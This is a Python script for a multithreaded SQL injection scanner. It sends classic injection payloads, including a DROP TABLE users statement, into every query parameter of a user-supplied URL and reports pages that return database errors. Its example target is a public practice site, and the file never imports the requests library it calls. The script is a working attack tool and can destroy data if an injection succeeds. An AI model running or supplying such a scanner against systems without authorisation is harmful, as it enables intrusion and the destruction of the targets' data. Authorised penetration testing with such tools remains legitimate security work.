
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
import threading
from queue import Queue
import time

# SQL Injection test payloads
payloads = [
    "' OR '1'='1",
    "' OR 1=1--",
    "' OR 'a'='a",
    "'; DROP TABLE users--",
    "\" OR \"1\"=\"1"
]

# SQL error indicators
error_signs = [
    "sql syntax",
    "mysql",
    "syntax error",
    "unclosed quotation",
    "database error",
    "warning: mysql",
    "pdoexception"
]

# Thread-safe queue
url_queue = Queue()

# Lock for printing
lock = threading.Lock()

# Log file
log_file = open("sql_scan_results.txt", "w")


def is_vulnerable(response_text):
    for error in error_signs:
        if error.lower() in response_text.lower():
            return True
    return False


def inject_payload(url, payload):
    parsed = urlparse(url)
    query_params = parse_qs(parsed.query)

    vulnerable = False

    for param in query_params:
        temp_params = query_params.copy()
        temp_params[param] = payload

        new_query = urlencode(temp_params, doseq=True)
        new_url = urlunparse(parsed._replace(query=new_query))

        try:
            response = requests.get(new_url, timeout=5)

            if is_vulnerable(response.text):
                with lock:
                    print(f"[VULNERABLE] {new_url}")
                    log_file.write(f"[VULNERABLE] {new_url}\n")
                vulnerable = True

        except requests.exceptions.RequestException:
            pass

    return vulnerable


def worker():
    while not url_queue.empty():
        url = url_queue.get()

        for payload in payloads:
            inject_payload(url, payload)
            time.sleep(0.5)  # Rate limiting

        url_queue.task_done()


def main():
    print("=== SQL Injection Scanner ===")
    target = input("Enter target URL (with parameters): ")

    # Example: http://testphp.vulnweb.com/listproducts.php?cat=1

    thread_count = int(input("Threads (e.g., 5): "))

    url_queue.put(target)

    threads = []

    for _ in range(thread_count):
        t = threading.Thread(target=worker)
        t.start()
        threads.append(t)

    url_queue.join()

    print("Scan completed. Check sql_scan_results.txt")
    log_file.close()


if __name__ == "__main__":
    main()